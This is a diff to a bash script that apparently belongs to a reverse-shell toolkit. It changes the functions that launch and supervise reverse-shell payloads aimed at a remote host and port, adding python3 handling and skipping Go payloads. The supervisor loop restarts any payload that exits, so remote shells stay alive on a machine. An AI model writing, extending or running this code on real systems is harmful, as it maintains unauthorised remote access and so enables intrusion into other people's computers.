@@ -305,11 +305,18 @@ launch_reverse_payloads() {
                 log "Launching $(reg_field "${id}" 1) -> icmp to ${rhost}" ;;
             *)        log "Launching $(reg_field "${id}" 1) -> ${rhost}:${rport}" ;;
         esac
-        setsid bash "${path}" >> "${SERVER_DIR}/logs/${id}.log" 2>&1 &
+        local payload_interp="bash"
+        case "${id}" in
+            python|python-pty|wssh) payload_interp="python3" ;;
+            golang)                 continue ;;   # go sources need compilation; skip auto-run
+        esac
+        case "${payload_interp}" in
+            python3) setsid python3 "${path}" >> "${SERVER_DIR}/logs/${id}.log" 2>&1 & ;;
+            *)       setsid bash "${path}" >> "${SERVER_DIR}/logs/${id}.log" 2>&1 & ;;
+        esac
         CHILD_PIDS["${id}"]=$!
     done
 }
-
 # ---------------------------------------------------------------- supervisor
 supervise_loop() {
     local id pid path sleep_mode="${SHELL_SUPERVISE_SLEEP:-5}"
@@ -332,10 +339,17 @@ supervise_loop() {
                         warn "$(reg_field "${id}" 1) payload exited; restarting..."
                         "rev_start_${id//-/_}" >/dev/null 2>&1 || true
                         path="${REV_PAYLOAD_PATH[${id}]:-}"
-                        [ -n "${path}" ] && [ -f "${path}" ] && {
-                            setsid bash "${path}" >/dev/null 2>&1 &
-                            CHILD_PIDS["${id}"]=$!
-                        }
+                        [ -n "${path}" ] && [ -f "${path}" ] || continue
+                        local payload_interp="bash"
+                        case "${id}" in
+                            python|python-pty|wssh) payload_interp="python3" ;;
+                            golang)                 continue ;;
+                        esac
+                        case "${payload_interp}" in
+                            python3) setsid python3 "${path}" >/dev/null 2>&1 & ;;
+                            *)       setsid bash "${path}" >/dev/null 2>&1 & ;;
+                        esac
+                        CHILD_PIDS["${id}"]=$!
                     fi
                     ;;
             esac
